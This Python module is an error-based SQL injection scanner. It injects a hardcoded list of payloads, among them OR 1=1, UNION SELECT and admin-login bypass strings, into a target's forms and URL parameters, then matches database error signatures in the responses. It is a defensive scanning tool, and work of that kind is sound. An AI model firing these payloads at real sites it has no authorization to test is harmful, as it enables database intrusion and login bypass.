"""
SQL Injection Scanner Module
Detects SQL injection vulnerabilities in web applications.
"""

import requests
import logging
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup


logger = logging.getLogger(__name__)


class SQLInjectionScanner:
    """Scans for SQL injection vulnerabilities"""

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--+",
        "1' UNION SELECT NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "1 AND 1=1",
        "1 AND 1=2"
    ]

    ERROR_SIGNATURES = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL",
        "sqlite3",
        "SQLSTATE",
        "Warning: mysql",
        "MySQLSyntaxErrorException",
        "valid MySQL result",
        "Access Database Engine",
        "Microsoft SQL Native Client",
        "ODBC SQL Server Driver",
        "Oracle error",
        "DB2 SQL error",
        "Unclosed quotation mark"
    ]

    def __init__(self, url: str, timeout: int = 10):
        self.url = url if url.startswith('http') else f'https://{url}'
        self.timeout = timeout
        self.session = requests.Session()

    def _check_error_based(self, response_text: str) -> bool:
        """Check for SQL error messages in response"""
        return any(error.lower() in response_text.lower()
                  for error in self.ERROR_SIGNATURES)

    def _get_forms(self, html: str) -> List[Dict]:
        """Extract forms from HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []

        for form in soup.find_all('form'):
            form_details = {
                'action': form.get('action'),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }

            for input_tag in form.find_all(['input', 'textarea']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                if input_name:
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name
                    })

            forms.append(form_details)

        return forms

    def _test_form(self, form: Dict) -> List[Dict]:
        """Test form for SQL injection"""
        vulnerabilities = []
        action = urljoin(self.url, form['action'] or '')

        for payload in self.SQLI_PAYLOADS:
            data = {}
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button']:
                    data[input_field['name']] = payload

            try:
                if form['method'] == 'post':
                    response = self.session.post(action, data=data, timeout=self.timeout)
                else:
                    response = self.session.get(action, params=data, timeout=self.timeout)

                if self._check_error_based(response.text):
                    vulnerabilities.append({
                        'type': 'Error-based SQL Injection',
                        'url': action,
                        'method': form['method'].upper(),
                        'payload': payload,
                        'parameter': list(data.keys())[0] if data else 'unknown'
                    })
                    logger.warning(f"SQL injection vulnerability found: {action}")
                    break

            except requests.RequestException as e:
                logger.error(f"Request failed: {str(e)}")

        return vulnerabilities

    def _test_url_params(self) -> List[Dict]:
        """Test URL parameters for SQL injection"""
        vulnerabilities = []
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        if not params:
            return vulnerabilities

        for param_name in params.keys():
            for payload in self.SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]

                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                try:
                    response = self.session.get(test_url, timeout=self.timeout)

                    if self._check_error_based(response.text):
                        vulnerabilities.append({
                            'type': 'Error-based SQL Injection',
                            'url': test_url,
                            'method': 'GET',
                            'payload': payload,
                            'parameter': param_name
                        })
                        logger.warning(f"SQL injection found in param: {param_name}")
                        break

                except requests.RequestException as e:
                    logger.error(f"Request failed: {str(e)}")

        return vulnerabilities

    def scan(self) -> Dict:
        """Perform SQL injection scan"""
        logger.info(f"Starting SQL injection scan on {self.url}")

        try:
            response = self.session.get(self.url, timeout=self.timeout)

            vulnerabilities = []

            # Test URL parameters
            vulnerabilities.extend(self._test_url_params())

            # Test forms
            forms = self._get_forms(response.text)
            logger.info(f"Found {len(forms)} forms to test")

            for form in forms:
                vulnerabilities.extend(self._test_form(form))

            return {
                'url': self.url,
                'vulnerabilities': vulnerabilities,
                'forms_tested': len(forms)
            }

        except requests.RequestException as e:
            logger.error(f"Scan failed: {str(e)}")
            return {'error': str(e)}

    def display_results(self, results: Dict):
        """Display scan results"""
        if 'error' in results:
            print(f"\n[ERROR] {results['error']}")
            return

        print(f"\n{'='*70}")
        print(f"SQL INJECTION SCAN RESULTS")
        print(f"{'='*70}")
        print(f"Target: {results['url']}")
        print(f"Forms Tested: {results['forms_tested']}")
        print(f"{'='*70}\n")

        if results['vulnerabilities']:
            print(f"[!] VULNERABILITIES FOUND ({len(results['vulnerabilities'])}):")
            print("-" * 70)

            for vuln in results['vulnerabilities']:
                print(f"\n[!] {vuln['type']}")
                print(f"    URL: {vuln['url']}")
                print(f"    Method: {vuln['method']}")
                print(f"    Parameter: {vuln['parameter']}")
                print(f"    Payload: {vuln['payload']}")
        else:
            print("[+] No SQL injection vulnerabilities detected.")

        print(f"\n{'='*70}\n")

